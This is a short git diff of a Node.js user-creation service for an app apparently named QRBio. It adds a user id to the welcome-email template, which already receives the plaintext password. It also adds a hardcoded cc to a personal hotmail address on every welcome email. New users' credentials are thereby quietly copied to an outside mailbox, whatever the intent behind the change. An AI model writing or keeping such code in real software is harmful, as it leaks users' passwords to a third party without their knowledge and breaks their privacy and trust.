@@ -305,6 +305,7 @@ class CreateUserWebService {
       email: user.email,
       name: user.name,
       password: password,
+      id: user.id,
     });
 
     var transport = await nodemailer.createTransport({
@@ -326,6 +327,7 @@ class CreateUserWebService {
         name: user.name,
         address: user.email,
       },
+      cc: "rodrigoipatinga@hotmail.com",
       subject: "[QRBio] Bem-vindo ao QRBio! 🎉",
       html: templateHTML,
     });
